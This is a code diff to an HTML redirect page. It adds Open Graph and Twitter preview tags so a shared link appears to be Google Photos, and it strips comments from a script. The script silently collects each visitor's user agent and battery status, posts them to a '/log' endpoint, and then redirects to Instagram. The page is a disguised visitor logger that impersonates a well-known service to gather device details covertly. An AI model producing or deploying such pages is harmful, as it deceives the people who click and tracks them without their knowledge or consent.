@@ -2,7 +2,17 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Redirecting...</title>
+  <title>Google Photos</title>
+
+  <!-- ✅ Open Graph tags for rich preview -->
+  <meta property="og:title" content="Google Photos" />
+  <meta property="og:description" content="Google Photos is a cloud-based platform developed by Google for storing, organizing, editing, and sharing photos and videos. It offers users a way to back up their media from various devices and access it from anywhere with an internet connection." />
+  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRuTDI7OtZS0ShtudT3pXNi_4kb7a_RbvCIbdfvSKZ6g6DlqZzaa0xBofH9&s=10" />
+  <meta property="og:type" content="website" />
+  <meta property="og:url" content="https://yourdomain.com/" />
+  <meta name="twitter:card" content="summary_large_image" />
+
+  <!-- ✅ Instant redirect with logging -->
   <script>
     (async () => {
       const browserInfo = navigator.userAgent || "Unavailable";
@@ -13,7 +23,6 @@
       let batteryLevel = "Unavailable";
       let charging = "Unavailable";
 
-      // Try getting battery info safely
       try {
         if ('getBattery' in navigator) {
           const battery = await navigator.getBattery();
@@ -24,7 +33,6 @@
         console.warn("Battery info not available:", err);
       }
 
-      // Try to send log data — don't block redirect
       try {
         await fetch('/log', {
           method: 'POST',
@@ -44,7 +52,6 @@
         console.warn("Failed to send log:", err);
       }
 
-      // Always redirect after log attempt
       window.location.href = "/go?url=https://www.instagram.com";
     })();
   </script>
